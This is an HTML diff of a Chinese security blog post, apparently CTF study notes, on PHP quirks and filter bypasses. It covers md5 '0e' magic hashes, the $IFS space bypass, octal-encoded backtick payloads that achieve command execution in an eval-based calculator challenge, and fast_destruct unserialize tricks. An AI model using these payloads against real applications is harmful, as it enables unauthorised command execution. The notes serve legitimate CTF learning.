@@ -1,524 +1,100 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>PHP特性以及Bypass | w8nn9z Blog</title>
-<meta name="keywords" content="">
-<meta name="description" content="PHP特性以及Bypass - w8nn9z Blog">
-<meta name="author" content="">
-<link rel="canonical" href="https://z9nn8w.github.io/posts/web/php/">
-
-<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/web/php/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/php/">
-  <meta property="og:site_name" content="w8nn9z Blog">
-  <meta property="og:title" content="PHP特性以及Bypass">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-07-13T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-11-10T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP特性以及Bypass">
-<meta name="twitter:description" content="">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://z9nn8w.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "WEB",
-      "item": "https://z9nn8w.github.io/posts/web/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "PHP特性以及Bypass",
-      "item": "https://z9nn8w.github.io/posts/web/php/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "PHP特性以及Bypass",
-  "name": "PHP特性以及Bypass",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": " 积累并记录一些bypass\nmd5 0e绕过，注意0e后必须全是数字，否则仍会被当作字符串进行比较：\n可以自行爆破来找符合条件的\n两次md5后是0e开头：\niv2Cn\rf2WfQ 一次md5后是0e开头：\n240610708 空格绕过 对于执行shell命令的环境往往会过滤空格，但是由于shell本身的特性，导致出现一些bypass，如$IFS等，常见绕过原理如下： $IFS是shell中的字段分隔符，默认值为 空格、Tab、换行\nphp反引号+八进制\\dxxx实现RCE Simple Calculator [L3akCTF 2024]\n题目给了index.php的源码：\n\u003c?php function popCalc() { if (isset($_GET['formula'])) { $formula = $_GET['formula']; if (strlen($formula) \u003e= 150 || preg_match('/[a-z\\'\"]+/i', $formula)) { return 'Try Harder !'; } try { eval('$calc = ' . $formula . ';'); return isset($calc) ? $calc : '?'; } catch (ParseError $err) { return 'Error'; } } } $result = popCalc(); echo \"Result: \" . $result; ?\u003e $formula是个可控的变量，不允许长度超过150，同时字符串中不能出现字母和大小写引号\n本题的bypass运用到了如下的两个特性：\n1.PHP中反引号中的内容会被作为shell 命令来执行，并将其输出信息返回\n2.PHP中\\ddd表示的是1~3位八进制ASCII值对应字符\nls对应payload为?formula=`\\154\\163`\rResult: flag-YQUO4fGlBZhRt3qZAg9Xnneyunqm5kmiP6CvM2JafYJ9alzgOTWYp3lNxTsaZlhd.txt\rindex.php\rcat f*对应payload为?formula=`\\143\\141\\164\\40\\146\\52`\rResult: L3AK{PhP_Web_Ch@ll3ng3} true在弱比较时的特性 除了空对象以外，目前只发现0值以及其他类型空值与true进行弱比较会判断为false：\n\u003c?php $emptyArr = array(); $emptystr = \"\"; if (true == 0 || true == null || true == $emptyArr || true == $emptyStr || true == false){ echo \"impossible\"; } class A { } $obj = new A(); $arr = array(''); if (true == 114514 \u0026\u0026 true == 0.1 \u0026\u0026 true == $obj \u0026\u0026 true == $arr \u0026\u0026 true == \"a\" \u0026\u0026 true == true ) { echo \"true\"; } ?\u003e 反序列化中 fast_destruct 绕过 throw 如果在程序结束销毁所有对象之前有throw抛出异常，则无法实现__destruct()函数的触发：\n\u003c?php class User { public $username = \"sxc\"; public $age = 258; public function __destruct() { print(\"successfully bypass throw\"); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;} $ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}'; $unser = unserialize($ser); throw new Exception(\"you can't destruct\"); 这个程序只会抛出异常，而不会执行__destruct()\n要绕过这个throw需要利用php的fast_destruct特性：\n方式一，删去末尾一个花括号}：$ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;';\r方式二，修改序列化数字元素个数，将User后的2改为其他值：$ser = 'O:4:\"User\":3:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}';\r方式三，先构造形如array($a, 0)的数组，再将最后的i:1改为i:0：$ser = 'a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:0;i:0;}'; \u003c?php class User { public $username = \"sxc\"; public $age = 258; public function __destruct() { print(\"successfully bypass throw\"); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;} // $a = new User(); // $ser = serialize(array($a,0)); // print($ser); # a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:1;i:0;} # $ser = 'a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:0;i:0;}'; # $ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;'; $ser = 'O:4:\"User\":3:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}'; $user = unserialize($ser); throw new Exception(\"you can't destruct\"); ?\u003e 参考资料： https://zhuanlan.zhihu.com/p/405838002\n",
-  "wordCount" : "966",
-  "inLanguage": "en",
-  "datePublished": "2025-07-13T00:00:00Z",
-  "dateModified": "2025-11-10T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://z9nn8w.github.io/posts/web/php/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "w8nn9z Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://z9nn8w.github.io/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/posts" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/archives" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/about" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      PHP特性以及Bypass
-    </h1>
-    <div class="post-meta"><span title='2025-07-13 00:00:00 +0000 UTC'>July 13, 2025</span>
-
-</div>
-  </header> <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details >
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#md5" aria-label="md5">md5</a></li>
-                    <li>
-                        <a href="#%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87" aria-label="空格绕过">空格绕过</a></li>
-                    <li>
-                        <a href="#php%e5%8f%8d%e5%bc%95%e5%8f%b7%e5%85%ab%e8%bf%9b%e5%88%b6dxxx%e5%ae%9e%e7%8e%b0rce" aria-label="php反引号&#43;八进制\dxxx实现RCE">php反引号+八进制\dxxx实现RCE</a></li>
-                    <li>
-                        <a href="#true%e5%9c%a8%e5%bc%b1%e6%af%94%e8%be%83%e6%97%b6%e7%9a%84%e7%89%b9%e6%80%a7" aria-label="true在弱比较时的特性">true在弱比较时的特性</a></li>
-                    <li>
-                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ad-fast_destruct-%e7%bb%95%e8%bf%87-throw" aria-label="反序列化中 fast_destruct 绕过 throw">反序列化中 fast_destruct 绕过 throw</a>
-                    </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-
-  <div class="post-content"><blockquote>
-<p>积累并记录一些bypass</p></blockquote>
-<h2 id="md5">md5<a hidden class="anchor" aria-hidden="true" href="#md5">#</a></h2>
-<p>0e绕过，注意0e后必须全是数字，否则仍会被当作字符串进行比较：</p>
-<p>可以自行爆破来找符合条件的</p>
-<p>两次md5后是0e开头：</p>
-<pre tabindex="0"><code>iv2Cn
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PHP特性以及Bypass | w8nn9z Blog</title><meta name=keywords content><meta name=description content="PHP特性以及Bypass - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://z9nn8w.github.io/posts/web/php/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://z9nn8w.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://z9nn8w.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://z9nn8w.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://z9nn8w.github.io/apple-touch-icon.png><link rel=mask-icon href=https://z9nn8w.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://z9nn8w.github.io/posts/web/php/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/web/php/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="PHP特性以及Bypass"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-13T00:00:00+00:00"><meta property="article:modified_time" content="2025-11-10T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="PHP特性以及Bypass"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://z9nn8w.github.io/posts/"},{"@type":"ListItem","position":2,"name":"WEB","item":"https://z9nn8w.github.io/posts/web/"},{"@type":"ListItem","position":3,"name":"PHP特性以及Bypass","item":"https://z9nn8w.github.io/posts/web/php/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PHP特性以及Bypass","name":"PHP特性以及Bypass","description":"","keywords":[],"articleBody":" 积累并记录一些bypass\nmd5 0e绕过，注意0e后必须全是数字，否则仍会被当作字符串进行比较：\n可以自行爆破来找符合条件的\n两次md5后是0e开头：\niv2Cn\rf2WfQ 一次md5后是0e开头：\n240610708 空格绕过 对于执行shell命令的环境往往会过滤空格，但是由于shell本身的特性，导致出现一些bypass，如$IFS等，常见绕过原理如下： $IFS是shell中的字段分隔符，默认值为 空格、Tab、换行\nphp反引号+八进制\\dxxx实现RCE Simple Calculator [L3akCTF 2024]\n题目给了index.php的源码：\n\u003c?php function popCalc() { if (isset($_GET['formula'])) { $formula = $_GET['formula']; if (strlen($formula) \u003e= 150 || preg_match('/[a-z\\'\"]+/i', $formula)) { return 'Try Harder !'; } try { eval('$calc = ' . $formula . ';'); return isset($calc) ? $calc : '?'; } catch (ParseError $err) { return 'Error'; } } } $result = popCalc(); echo \"Result: \" . $result; ?\u003e $formula是个可控的变量，不允许长度超过150，同时字符串中不能出现字母和大小写引号\n本题的bypass运用到了如下的两个特性：\n1.PHP中反引号中的内容会被作为shell 命令来执行，并将其输出信息返回\n2.PHP中\\ddd表示的是1~3位八进制ASCII值对应字符\nls对应payload为?formula=`\\154\\163`\rResult: flag-YQUO4fGlBZhRt3qZAg9Xnneyunqm5kmiP6CvM2JafYJ9alzgOTWYp3lNxTsaZlhd.txt\rindex.php\rcat f*对应payload为?formula=`\\143\\141\\164\\40\\146\\52`\rResult: L3AK{PhP_Web_Ch@ll3ng3} true在弱比较时的特性 除了空对象以外，目前只发现0值以及其他类型空值与true进行弱比较会判断为false：\n\u003c?php $emptyArr = array(); $emptystr = \"\"; if (true == 0 || true == null || true == $emptyArr || true == $emptyStr || true == false){ echo \"impossible\"; } class A { } $obj = new A(); $arr = array(''); if (true == 114514 \u0026\u0026 true == 0.1 \u0026\u0026 true == $obj \u0026\u0026 true == $arr \u0026\u0026 true == \"a\" \u0026\u0026 true == true ) { echo \"true\"; } ?\u003e 反序列化中 fast_destruct 绕过 throw 如果在程序结束销毁所有对象之前有throw抛出异常，则无法实现__destruct()函数的触发：\n\u003c?php class User { public $username = \"sxc\"; public $age = 258; public function __destruct() { print(\"successfully bypass throw\"); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;} $ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}'; $unser = unserialize($ser); throw new Exception(\"you can't destruct\"); 这个程序只会抛出异常，而不会执行__destruct()\n要绕过这个throw需要利用php的fast_destruct特性：\n方式一，删去末尾一个花括号}：$ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;';\r方式二，修改序列化数字元素个数，将User后的2改为其他值：$ser = 'O:4:\"User\":3:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}';\r方式三，先构造形如array($a, 0)的数组，再将最后的i:1改为i:0：$ser = 'a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:0;i:0;}'; \u003c?php class User { public $username = \"sxc\"; public $age = 258; public function __destruct() { print(\"successfully bypass throw\"); } } // $a = new User(); // $ser = serialize($a); // print($ser); # O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;} // $a = new User(); // $ser = serialize(array($a,0)); // print($ser); # a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:1;i:0;} # $ser = 'a:2:{i:0;O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}i:0;i:0;}'; # $ser = 'O:4:\"User\":2:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;'; $ser = 'O:4:\"User\":3:{s:8:\"username\";s:3:\"sxc\";s:3:\"age\";i:258;}'; $user = unserialize($ser); throw new Exception(\"you can't destruct\"); ?\u003e 参考资料： https://zhuanlan.zhihu.com/p/405838002\n","wordCount":"966","inLanguage":"en","datePublished":"2025-07-13T00:00:00Z","dateModified":"2025-11-10T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://z9nn8w.github.io/posts/web/php/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://z9nn8w.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://z9nn8w.github.io/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://z9nn8w.github.io/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://z9nn8w.github.io/posts title=文章><span>文章</span></a></li><li><a href=https://z9nn8w.github.io/archives title=归档><span>归档</span></a></li><li><a href=https://z9nn8w.github.io/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">PHP特性以及Bypass</h1><div class=post-meta><span title='2025-07-13 00:00:00 +0000 UTC'>July 13, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#md5 aria-label=md5>md5</a></li><li><a href=#%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87 aria-label=空格绕过>空格绕过</a></li><li><a href=#php%e5%8f%8d%e5%bc%95%e5%8f%b7%e5%85%ab%e8%bf%9b%e5%88%b6dxxx%e5%ae%9e%e7%8e%b0rce aria-label=php反引号+八进制\dxxx实现RCE>php反引号+八进制\dxxx实现RCE</a></li><li><a href=#true%e5%9c%a8%e5%bc%b1%e6%af%94%e8%be%83%e6%97%b6%e7%9a%84%e7%89%b9%e6%80%a7 aria-label=true在弱比较时的特性>true在弱比较时的特性</a></li><li><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ad-fast_destruct-%e7%bb%95%e8%bf%87-throw aria-label="反序列化中 fast_destruct 绕过 throw">反序列化中 fast_destruct 绕过 throw</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><blockquote><p>积累并记录一些bypass</p></blockquote><h2 id=md5>md5<a hidden class=anchor aria-hidden=true href=#md5>#</a></h2><p>0e绕过，注意0e后必须全是数字，否则仍会被当作字符串进行比较：</p><p>可以自行爆破来找符合条件的</p><p>两次md5后是0e开头：</p><pre tabindex=0><code>iv2Cn
 f2WfQ
-</code></pre><p>一次md5后是0e开头：</p>
-<pre tabindex="0"><code>240610708
-</code></pre><h2 id="空格绕过">空格绕过<a hidden class="anchor" aria-hidden="true" href="#空格绕过">#</a></h2>
-<p>对于执行shell命令的环境往往会过滤空格，但是由于shell本身的特性，导致出现一些bypass，如<code>$IFS</code>等，常见绕过原理如下：
-<code>$IFS</code>是shell中的字段分隔符，默认值为 空格、Tab、换行</p>
-<h2 id="php反引号八进制dxxx实现rce">php反引号+八进制\dxxx实现RCE<a hidden class="anchor" aria-hidden="true" href="#php反引号八进制dxxx实现rce">#</a></h2>
-<p>Simple Calculator [L3akCTF 2024]</p>
-<p>题目给了index.php的源码：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">popCalc</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;formula&#39;</span>])) {
-</span></span><span style="display:flex;"><span>        $formula <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;formula&#39;</span>];
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strlen</span>($formula) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">150</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[a-z\&#39;&#34;]+/i&#39;</span>, $formula)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Try Harder !&#39;</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#39;$calc = &#39;</span> <span style="color:#f92672">.</span> $formula <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;;&#39;</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">isset</span>($calc) <span style="color:#f92672">?</span> $calc <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;?&#39;</span>;
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">ParseError</span> $err) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Error&#39;</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
